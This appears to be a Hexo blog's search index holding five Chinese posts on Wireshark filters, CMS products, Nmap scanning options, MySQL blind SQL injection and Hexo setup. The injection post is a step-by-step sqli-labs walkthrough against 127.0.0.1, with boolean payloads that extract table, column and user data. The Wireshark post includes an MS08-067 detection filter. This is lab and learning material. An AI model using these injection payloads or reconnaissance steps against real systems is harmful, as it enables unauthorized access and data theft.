<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[wireshark入门]]></title>
    <url>%2Fzerotwo%2F2019%2F10%2F08%2Fwireshark%E5%85%A5%E9%97%A8%E4%BA%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[WireShark 主要分为这几个界面1. Display Filter(显示过滤器)， 用于过滤2. Packet List Pane(封包列表)， 显示捕获到的封包， 有源地址和目标地址，端口号。 颜色不同，代表3. Packet Details Pane(封包详细信息), 显示封包中的字段4. Dissector Pane(16进制数据) 5. Miscellanous(地址栏，杂项) 过滤表达式的规则表达式规则 1. 协议过滤 比如TCP，只显示TCP协议。 2. IP 过滤 比如 ip.src ==192.168.1.102 显示源地址为192.168.1.102， ip.dst==192.168.1.102, 目标地址为192.168.1.102 3. 端口过滤 tcp.port ==80, 端口为80的 tcp.srcport == 80, 只显示TCP协议的愿端口为80的。 4. Http模式过滤 http.request.method==”GET”, 只显示HTTP GET方法的。 5. 逻辑运算符为 AND/ OR 常用的过滤表达式 过滤表达式 用途 http 只查看HTTP协议的记录 ip.src ==192.168.1.102 or ip.dst==192.168.1.102 源地址或者目标地址是192.168.1.102 封包详细信息 (Packet Details Pane)这个面板是我们最重要的，用来查看协议中的每一个字段。 各行信息分别为 Frame: 物理层的数据帧概况 Ethernet II: 数据链路层以太网帧头部信息 Internet Protocol Version 4: 互联网层IP包头部信息 Transmission Control Protocol: 传输层T的数据段头部信息 Hypertext Transfer Protocol: 应用层的信息 wireshark过滤匹配表达式实例1、 搜索按条件过滤udp的数据段payload（数字8是表示udp头部有8个字节，数据部分从第9个字节开始udp[8:]）udp[8]==14 (14是十六进制0x14)匹配payload第一个字节0x14的UDP数据包 udp[8:2]==14:05 可以udp[8:2]==1405，且只支持2个字节连续，三个以上须使用冒号：分隔表示十六进制。 (相当于 udp[8]==14 and udp[9]==05,1405是0x1405) udp[8:3]==22:00:f7 但是不可以udp[8:3]==2200f7 udp[8:4]==00:04:00:2a 匹配payload的前4个字节0x0004002a udp contains 7c:7c:7d:7d 匹配payload中含有0x7c7c7d7d的UDP数据包，不一定是从第一字节匹配。 2、**搜索按条件过滤tcp的数据段payload（数字20是表示tcp头部有20个字节，数据部分从第21个字节开始tcp[20:]）tcp[20:] matches “^GET [ -~]*HTTP/1.1\x0d\x0a” 等同http matches “^GET [ -~]*HTTP/1.1\x0d\x0a” tcp[20:] matches “^GET (.*?)HTTP/1.1\x0d\x0a” tcp[20:] matches “^GET (.?)HTTP/1.1\x0d\x0a[\x00-\xff]*Host: (.\?)pplive(.*?)\x0d\x0a” tcp[20:] matches “^GET (.?)HTTP/1.1\x0d\x0a[\x00-\xff]Host: “ tcp[20:] matches “^POST / HTTP/1.1\x0d\x0a[\x00-\xff]*\x0d\x0aConnection: Keep-Alive\x0d\x0a\x0d\x0a” 检测SMB头的smb标记，指明smb标记从tcp头部第24byte的位置开始匹配。 tcp[24:4] == ff:53:4d:42 检测SMB头的smb标记，tcp的数据包含十六进制ff:53:4d:42，从tcp头部开始搜索此数据。 tcp contains ff:53:4d:42 tcp matches “\xff\x53\x4d\x42” 检测tcp含有十六进制01:bd,从tcp头部开始搜索此数据。 tcp matches “\x01\xbd” 检测MS08067的RPC请求路径 tcp[179:13] == 00:5c:00:2e:00:2e:00:5c:00:2e:00:2e:00 3、**其他http.request.uri matches “.gif$” 匹配过滤HTTP的请求URI中含有”.gif”字符串，并且以.gif结尾（4个字节）的http请求数据包（$是正则表达式中的结尾表示符） 注意区别： http.request.uri contains “.gif$” 与此不同，contains是包含字符串”.gif$”（5个字节）。 匹配过滤HTTP的请求URI中含有”.gif$”字符串的http请求数据包（这里$是字符，不是结尾符） eth.addr[0:3]==00:1e:4f 搜索过滤MAC地址前3个字节是0x001e4f的数据包。]]></content>
      <categories>
        <category>日常</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CMS了解]]></title>
    <url>%2Fzerotwo%2F2019%2F10%2F04%2FCMS%E4%BA%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[是 Content Management System的英文缩写 中文名称是： 网站内容管理系统。国内与国外CMS系统的主要区别是：国内的CMS系统基本都生成真实的静态文件，非常节约服务器资源，访问速度快。国外的CMS基本都是动态调用，或者利用REWRITE映射成虚拟静态。国内的cms功能复杂，入口极多。初学者较难适应。国外的cms大方简单，功能简单，接口齐全，但需要程序基础。详细介绍请看这里： CMS比较 国内的cms开源少，适合直接使用。国外的开源多，适合二次开发。 国内的cms系统SEO搜索优化方面很重视，国外的不太在意。 国内的cms符合中国人习惯，国外的cms难以适用国情。 ASP系的CMS系统1.动易CMS管理系统官方网站：http://www.asp163.net/ 这套是国产AspCMS中非常强大的系统，从3.0的简单的一个文章系统到现在的2005的版本，一路走来，动易不断完善，而且也不断加强功能，包括个人版，学校版，政府版，企业版，后台包括的功能，信息发布，类别管理，权限控制，信息采集，而且跟第三方的程序，比如论坛，商城（2005的已经自带了），blog可以完美结合，基本上可以满足一个中大型网站的要求，但Asp和Access的的局限性，还有本身功能Dll 的限制，使得免费版差不多成鸡肋。 2.风讯CMS官方网站：http://www.foosun.cn/ 风讯的系统功能强大，自由度高，是现在人气比较高的系统之一，可以根据自己的想法做出一个网页从而建立一个有自我风格的网站，更新速度快，一直有新的版本出现，现在又开放采集、下载、投稿、图片整站管理系统，第三方整合等功能，开源是它最大特点，希望保持。然后缺点就是后台人性化差了一点，上手有点难度，而且连一套默认的模板都没有，因为自由度太高了，让一些新手更难上手，还有就是免费版的生成静态发布的效率不高。3.1已经出来一段时间了，愿各方面都更上一层楼。 3.新云网站管理系统官方http://www.newasp.cn/ 一款Asp的CMS后起之秀，发现有不少的网站都在使用。由文章、下载、商城、留言、用户管理五大功能模块和广告、公告、连接、统计、采集、模板管理、数据库管理等多个通用模块组成，而且功能确实有一些值得称道的地方，不过又是DLL的，免费版有不少的限制，但对一个简单基本的网站来说，功能够用了。 4.乔客CMS(asp)官方网站：http://www.joekoe.com/ 这个系统已经很久了，但好像一直存活在动易和风讯两者之间，现在3.0的Joekoe CMS出来了，但另我比较失望，相比免费版的1.2，功能是增强了，但也Dll，这个可能也是国产程序的一个特色罢了。它本身已经是一个融合度非常高的系统，有商城，新闻，下载，论坛，留言，影视，博客圈等，感觉有那么点WEB2.0 的味道,不想怎么修改的朋友直接拿去就可以用了。 5.NB文章系统(asp)官方：http://forum.nbarticle.com/ 现在最新的是v2.1 RC1 ，上手挺容易，后台很简洁，安全性能不错，发布效率比较高，当然想到同类型的，RSS不错，它也是将模板写入数据库，但修改还是蛮方便。不过这样相对来说功能是少了一些，而且官方就一个论坛技术支持，论坛的人气差了一点。 6.渐飞新闻出版系统(asp)官方网站： http://www.xunt.net/ 这个系统也有一段时日了，不过到现在还是1.1的版本，以前名头特别响，不过主要针对的是商业客户，看客户演示，个个都像门户，但因为没免费版的支撑，市场也一直没做大。 基于PHP的CMS系统1.DEDE－这是一款国内开源的cms，作者是一个个人，能做出如此功能的cms，是相当不错的。2007版功能十分强大，希望能改善之前数据量一大，更新静态页就很慢的缺点。因为开源，有较多的玩家和拥护者。非常适合有一定编程基础的站长。 官方：http://www.dedecms.com 2. phpcms－一个综合的网站管理系统，由PHP+MYSQL构架全站生成html，能够快速高效地应用于LINUX和WINDOWS服务器平台，是目前中国LINUX环境下最佳的网站管理应用解决方案之一。据传被酷6收购。 官方：http://www.phpcms.cn 3. 帝国网站管理系统－Ecms全称为＂帝国网站管理系统＂，英文译为＂Empire CMS＂简称＂Ecms＂.Ecms是基于B/S结构，且功能强大而易用的网站管理系统．是一个经过完善设计的适用于Linux/windows /Unix等环境下高效的网站解决方案。 官方：http://www.phome.net 4. php168－PHP168整站系统，代码全部开源，可方便的进行二次开发，功能模块可以自由安装与删除，个人用户免费使用。系统频道模块很多，适合作个人门户网站。较多页面没有生成静态页。如果你想建站，就义无反顾的选择它吧！！！ 官方：http://www.php168.com 5. HBcms一个以PHP官方推荐的PEAR+SMARTY技术架构的cms，比较容易上手，适合没经验的新人做网站。没有下载，分类信息等模块，适合做文章为主的网站。全站生成静态页，默认附带了几套模板，可以方便的更换模板。个人企业都免费，无需授权。 官方：http://www.hbcms.com/ 6. SupSite－一款将论坛资源自动转换成门户网站的php程序系统，使用SupeSite，并利用你现有的论坛，你将自动拥有一个功能完备的，资源丰富的站点系统；由论坛变成网站，一切都是自动完成，你不需要任何干涉。让你轻轻松松实现建立网站的目的。 官方：http://www.supsite.net 7. 曼波－MAMBO一个国外的CMS系统，功能很强大，支持添加很多组件，模块;拥有丰富的模板.Mambo是一个网站内容管理系统(CMS)，它是网站的后台引擎，使网站内容的创建、管理和共享更加简易。Mambo十分强大，但官方网站也承认，它不是典型的“门户”网站解决方案。 官方：http://www.mamboserver.com 8. Joomla!是一套在国外相当知名的内容管理系统，2007年开源cms第一名！Joomla!是使用PHP语言加上MySQL数据库所开发的软件系统，可以在 Linux、Windows、MacOSX等各种不同的平台上执行。操作接口除了美观之外，也花了很多心力在设计这些接口的简易操作性。但初次使用者，需要花一点时间学习一下操作的方式，才能运用自如。。 官方：http://www.joomla.org/ 9. Drupal－Drupal是一个强大的软件，它可以让个人或社区使用者很容易地发表、管理并组织一个网站里大量且多样的内容。已经有许多个人和组织采用 Drupal来建立各种不同的网站。Drupal是一套采用GPL授权的开放源码软件，是由数以千计的使用者和开发人员所共同维护和开发的。 官方：http://drupal.org/ 10. WordPress- 是一款基于PHP和MySQL的Blog软件，但是它也可以当作简单的cms系统来用。通过它可以快速而简便的搭建属于你自己的Blog（网站）平台。简而言之,这个Wordpress就相当于咱们用来搭建论坛的那些程序,比如用在自留地上的雷傲,还有别的比如PHPBB等等…Wordpress因为它的安装简单和可扩展性好几乎已经成了独立搭建Blog平台的第一选择。Wordpress还有一个MU就是多用户的版本,支持多用户的Blog系统。 官方：http://wordpress.org/ .Net系列的CMS系统1.动网新闻(asp.net)最新的4.X也出来了，也是DLL的，不过系统是.NET的，不过我个人不趋向使用DLL的系统，运行速度快，效率高，安全做足。 不过以前3.X的没有Dll，感觉也蛮好的，缺点就是风格改起来不容易。现在加密了，反而能更快上手，不过这样可以定制的地方就少了。 目前风讯和动易都推出了基于.net的CMS系统 2.netcmsNetCMS是基于ASP.NET2.0开发的网站内容管理系统，采用sql server数据库，程序完全开源，没有任何文件加密, 不需要注册任何组件。在完全遵守NetCMS最终用户授权协议的基础上，非商业用途免费。 推荐理由：可以研究其设计思路、程序架构、编码风格和模板引擎逻辑等等。 官方网站：http://www.aspxcms.com/ 3.闪睿企业网站管理系统闪睿是一套针对企业的网站管理系统，采用 ASP.NET2.0 编写，支持 Access，MSSql 数据库。 * 1国际化编码，可同时支持任意多种语言 * 2针对搜索引擎优化，静态化页面，客户更容易找到您。 * 3模板制作简单，灵活，最少只需2页html。 * 4完善的后台管理,企业网站管理模块应有尽有，可无限扩展，随意增删改。 * 5优秀的系统架构，数据结构，使用页面高速缓存，站点访问速度快。 * 6专业精致的界面设计，无论是默认模板还是管理后台。 * 7高可用性设计，前台后台操作简单方便。 * 8支持Access和MSSql数据库。 * 9强劲的数据验证机制，保障系统安全。 缺点是不开源。 推荐理由：可以研究其设计思路、程序架构、模板引擎逻辑，另外他的后台管理界面风格我个人比较喜欢:) 官方地址：http://www.shanrui.net/L1U1397.aspx 演示站点：http://www.shanrui.net/L2U1397.aspx 免费版和商业版的区别： http://www.shanrui.net/L1U1397.aspx 4.锐商企业CMS锐商企业CMS作为面向企业的CMS产品，结合企业用户的特点，设计了，包括编译级主题模板，JIT 渲染引擎，网站前端编辑系统（FrEE），多国语言支持，W3C标准的支持与内建的SEO支持等独到的功能。基于asp.net+sql server，可惜不开源。 推荐理由：前端编辑系统很不错 官方网站：http://comsharp.com/ 演示站点：http://demo1.comsharp.com/ ～ http://demo10.comsharp.com/ 5.SiteServer CMSSiteServer CMS 是基于微软 .NET 平台开发的网站内容管理系统，它集成了内容发布管理、多站点集成、信息采集、搜索引擎优化、全文检索等多项强大功能，能够生成纯静态页面，独创的 STL 模版语言，通过Dreamweaver可视化插件能够轻易编辑模版样式。 推荐理由：STL模版语言 官方网站：http://www.siteserver.cn 个人免费版下载：http://www.siteserver.cn/download/contents/67.html JSP系列的CMS系统大概有这些： 1.Netark CMS2.方正翔宇CMS3.开源的Magnolia4.Magnolia CMS额外补充国外CMS：WordPress，Joomla，Drupal国内CMS：Dedecms商城：Magento，OpenCart，ZenCart]]></content>
      <categories>
        <category>日常</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Nmap使用]]></title>
    <url>%2Fzerotwo%2F2019%2F09%2F30%2FNmap%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[nmap这个渗透工具一般用在渗透的准备阶段，用于收集用户的信息，为后面的渗透做情报支持一.nmap的安装和扫描的基本概念首先对于nmap的安装，可以自行百度，当然kali linux是内置了nmap的，只要在命令行下输入nmap即可使用，参数-version可以查看当前nmap的版本然后对于扫描简单的来说其实就是四个动作 1.统一沟通语言 （TCP/IP协议） 2.发出刺激 （ICMP报文头） 3.受到刺激的反馈 （ICMP的反馈） 4通过比对刺激和反馈完成扫描 二.如何找到网络上的设备nmap的基本输入： 将你要扫描的设备地址告诉nmap可以通过下面的方法实现 统一格式：nmap [扫描类型] [设置] {设备地址} 其中设备地址（主机名，IP地址，网段等）可以通过以下方法 1.-iL &lt;文件名&gt; 通过文件输入地址 2.-iR &lt;IP地址数目&gt; 3.–exclude :排出文件中的地址 4.直接输入IP或网段（最常用） 上面是nmap两个简单扫描例子，仅反馈了一些简单的信息，但是对于其他的数据收集，nmap里面有详细的参数可以实现，下面将开始讲解一些常用参数的使用： 扫描参数： 1.-sL 不做扫描，仅完成DNS解析和网址的转换 2.-sP 默认发ICMP echo请求和TCP的ACK请求（80端口） 3.-PN 不用ping 4.-Ps &lt;端口号列表&gt; 发TCP协议SYN标记的空包（80端口） 5.-PA &lt;端口号列表&gt; 发TCP协议ACK标记的空包（80端口） 6.-PU &lt;端口号列表&gt; （31338端口） 7.-PE -PP -PM 8.-PO &lt;协议列表&gt; 9.-PR （ARP ping） 设置参数： –traceroute-n（不要做DNS解析）-R（DNS解析所有的地址，默认不解析不在线的IP）-system-dns（使用系统DNS）–dns-servers [,[,…]](使用其他DNS) 三.端口扫描概要1.端口扫描： -p &lt;端口号列表&gt; 2.端口状态： 1.Open，端口开启，有程序监听此端口 2.Closed，端口关闭，数据能到达主机，但是没有程序监听此端口。 3.Filtered，数据未能到达主机。 4.Unfiltered，数据能到达主机，但是Nmap无法判断端口开启还是关闭。 5.Open|filtered，端口没有返回值，主要出现在UDP，IP，FIN，NULL和Xmas扫描 6.Closed|filtered，只出现在IP ID idle 扫描。 四.端口扫面技术和算法1.TCP标志位扫描 -sS TCP SYN扫描（匿名扫描，默认不加类型，需要root权限，扫描速度快） -sT TCP全连接扫描（不需要root权限，TCP扫描的默认模式，端口状态和SYN相同,耗时长） 2.UDP扫描 -sU （使用-sUV能增加扫描的准确性） 没有UDP端口开放 3.协议扫描 -sO 获取服务器支持哪些协议 常用的扫描一般就上面几种 五.优化nmap的性能-F (快速扫描100个常用端口) 六.服务和应用程序版本的识别有时候nmap探测出来的服务和版本信息并不是非常准确，不过我们可以通过加参数的方式使其精确 1.-sV：探测开放端口的服务和版本信息2.–version-intensity&lt;0-9&gt;：设置探测深度3.–version-light：相当于0-24.–version-all：相当于0-95.–version-trace：显示版本扫描详情(用于调试) 七.远程操作系统的识别1.-O：启动操作系统识别。2.–osscan-limit：限定只识别有端口开放的主机，提高-O和-A参数时的扫描速度。3.–osscan-guest：给NMAP建议的操作系统。类似于sqlmap的参数。4.–max-os-tries &lt;次数&gt;：设置重试次数（默认为5），提高准确性或者提高速度。]]></content>
      <categories>
        <category>渗透工具使用</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL注入]]></title>
    <url>%2Fzerotwo%2F2019%2F09%2F29%2FMySQL%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[1：判断当前数据库的长度利用二分法http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;5 //正常显示http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;10 //不显示任何数据 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;7 //正常显示 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length(database())&gt;8 //不显示任何数据 大于7正常显示，大于8不显示，说明大于7而不大于8， 所以可知当前数据库长度为 8 2：判断当前数据库的字符和上面的方法一样，利用二分法依次判断//判断数据库的第一个字符 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr(database(),1,1))&gt;100//判断数据库的第二个字符 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr(database(),2,1))&gt;100 ………..由此可以判断出当前数据库为 security 3：判断当前数据库中的表http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select*from admin) //猜测当前数据库中是否存在admin表 1：判断当前数据库中表的个数// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4http://127.0.0.1/sqli/Less-5/?id=1&#39; and (select count(table\_name) from information\_schema.tables where table_schema=database())&gt;5 # 2：判断每个表的长度//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select table\_name from information\_schema.tables where table_schema=database() limit 0,1))=6 判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select table\_name from information\_schema.tables where table_schema=database() limit 1,1))=6 3：判断每个表的每个字符的ascii值//判断第一个表的第一个字符的ascii值 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select table\_name from information\_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 # 判断第一个表的第二个字符的ascii值 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select table\_name from information\_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 # ………由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断 4. 判断表中的字段http://127.0.0.1/sqli/Less-5/?id=1&#39; and exists(select username from admin) //如果已经证实了存在admin表，那么猜测是否存在username字段 1：判断表中字段的个数//判断users表中字段个数是否大于5，这里的users表是通过上面的语句爆出来的http://127.0.0.1/sqli/Less-5/?id=1&#39; and (select count(column\_name) from information\_schema.columns where table_name=&#39;users&#39;)&gt;5 # 2：判断字段的长度//判断第一个字段的长度http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select column\_name from information\_schema.columns where table_name=&#39;users&#39; limit 0,1))&gt;5 //判断第二个字段的长度 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select column\_name from information\_schema.columns where table_name=&#39;users&#39; limit 1,1))&gt;5 3：判断字段的ascii值//判断第一个字段的第一个字符的长度http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select column\_name from information\_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))&gt;100 //判断第一个字段的第二个字符的长度 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select column\_name from information\_schema.columns where table_name=&#39;users&#39; limit 0,1),2,1))&gt;100 ………..由此可判断出users表中存在 id、username、password 字段 5.判断字段中的数据我们知道了users中有三个字段 id 、username 、password，我们现在爆出每个字段的数据 1: 判断数据的长度// 判断id字段的第一个数据的长度http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select id from users limit 0,1))&gt;5 // 判断id字段的第二个数据的长度 http://127.0.0.1/sqli/Less-5/?id=1&#39; and length((select id from users limit 1,1))&gt;5 2：判断数据的ascii值// 判断id字段的第一个数据的第一个字符的ascii值http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select id from users limit 0,1),1,1))&gt;100 // 判断id字段的第一个数据的第二个字符的ascii值 http://127.0.0.1/sqli/Less-5/?id=1&#39; and ascii(substr((select id from users limit 0,1),2,1))&gt;100]]></content>
      <categories>
        <category>Web攻击-注入</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[博客搭建]]></title>
    <url>%2Fzerotwo%2F2019%2F09%2F28%2F%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[Hexo搭建步骤1. 安装Git2. 安装nodejs安装完后，安全npmnode -vnpm -v3. 安装hexo前面git和nodejs安装好后，就可以安装hexo了，先创建一个文件夹，然后cd到这个文件夹下（或者在这个文件夹下直接右键git bash打开）。npm install -g hexo-cli hexo -v查看版本 接下来初始化一下hexo hexo init myblog myblog可以自己取名字 cd myblog //进入这个myblog文件夹 新建完成后，指定文件夹目录下有： node_modules: 依赖包 public：存放生成的页面 scaffolds：生成文章的一些模板 source：用来存放你的文章 themes：主题 ** _config.yml: 博客的配置文件** hexo server 打开hexo的服务，在浏览器输入localhost:4000就可以看到生成的博客。 使用ctrl+c可以把服务关掉。 4. GitHub创建个人仓库有一个GitHub账户 注册完登录后，在GitHub.com中看到一个New repository，新建仓库 创建一个和你用户名相同的仓库，后面加.github.io，只有这样，将来要部署到GitHub page的时候，才会被识别，也就是xxxx.github.io，其中xxx就是你注册GitHub的用户名。 点击create repository。 5. 生成SSH添加到GitHub回到你的git bash中， git config --global user.name &quot;yourname&quot; git config --global user.email &quot;youremail&quot; 这里的yourname输入你的GitHub用户名，youremail输入你GitHub的邮箱。这样GitHub才能知道你是不是对应它的账户。 可以用以下两条，检查一下你有没有输对 git config user.name git config user.email 然后创建SSH,一路回车 ssh-keygen -t rsa -C &quot;youremail&quot; 它会告诉你已经生成了.ssh的文件夹。找到这个文件夹。 ssh，简单来讲，就是一个秘钥，其中，id_rsa是你这台电脑的私人秘钥，不能给别人看的，id_rsa.pub是公共秘钥，可以随便给别人看。把这个公钥放在GitHub上，这样当你链接GitHub自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到GitHub上。 而后在GitHub的setting中，找到SSH keys的设置选项，点击New SSH key 把你的id_rsa.pub里面的信息复制进去。 在gitbash中，查看是否成功 ssh -T git@github.com 6. 将hexo部署到GitHub将hexo和GitHub关联起来，将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，到最后，修改为 deploy: type: git repo: https://github.com/githubName/githubName.github.io.git（githubName就是你的GitHub账户） branch: master 先安装deploy-git ，也就是部署的命令,这样你才能用命令部署到GitHub。 npm install hexo-deployer-git --save 然后 hexo clean hexo generate hexo deploy 其中 hexo clean清除了你之前生成的东西，也可以不加。 hexo generate 顾名思义，生成静态文章，可以用 hexo g缩写 hexo deploy 部署文章，可以用hexo d缩写 注意deploy时可能要你输入username和password。 得到下图就说明部署成功了，过一会儿就可以在http://yourname.github.io博客]]></content>
      <categories>
        <category>日常</category>
      </categories>
  </entry>
</search>
